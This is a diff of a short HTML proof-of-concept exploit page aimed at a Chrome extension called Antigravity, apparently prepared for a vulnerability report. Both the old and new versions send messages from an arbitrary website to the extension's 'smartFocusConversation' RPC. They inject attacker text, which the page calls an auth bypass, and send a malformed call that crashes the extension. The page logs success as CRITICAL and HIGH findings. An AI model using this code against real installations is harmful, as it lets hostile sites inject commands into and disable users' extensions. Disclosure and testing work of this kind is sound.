@@ -1,36 +1,37 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-<head>
-  <title>Antigravity Extension RPC PoC</title>
-</head>
 <body>
-  <h2>External RPC Invocation PoC</h2>
-
-  <button onclick="crash()">DoS / Crash Test</button>
-  <button onclick="exploit()">Privileged RPC Test</button>
-
-  <pre id="out"></pre>
-
-  <script>
-    const EXT_ID = "eeijfnjmjelapkebgockoeaadonbchdd";
-
-    function send(msg) {
-      chrome.runtime.sendMessage(EXT_ID, msg, r => {
-        out.textContent = JSON.stringify(r, null, 2);
-      });
-    }
-
-    function crash() {
-      send({ action: "rpcCall" });
-    }
-
-    function exploit() {
-      send({
-        action: "rpcCall",
-        method: "smartFocusConversation",
-        params: { L: "Injected by malicious website" }
-      });
-    }
-  </script>
+    <h1>Antigravity Exploit PoC</h1>
+    <button onclick="run()">Execute Attack</button>
+    <div id="log"></div>
+    <script>
+        // REPLACE WITH ACTUAL TARGET ID
+        const EXT_ID = "eeijfnjmjelapkebgockoeaadonbchdd"; 
+        function log(msg) { 
+            document.getElementById('log').innerHTML += msg + "<br>"; 
+        }
+        function run() {
+            // 1. Proof of Auth Bypass
+            chrome.runtime.sendMessage(EXT_ID, {
+                action: "rpcCall",
+                method: "smartFocusConversation",
+                params: { L: "HACKED_PAYLOAD" }
+            }, r => {
+                if (r && r.message === "rpcCall received") {
+                     log("CRITICAL: Auth Bypass Successful! RPC command accepted.");
+                }
+            });
+            // 2. Proof of Crash (DoS)
+            chrome.runtime.sendMessage(EXT_ID, {
+                action: "rpcCall",
+                method: "smartFocusConversation"
+                // Missing 'params' triggers TypeError
+            }, r => {
+                if (r && r.error && r.error.includes("undefined")) {
+                    log("HIGH: DoS Successful! Extension crashed with TypeError.");
+                }
+            });
+        }
+    </script>
 </body>
 </html>
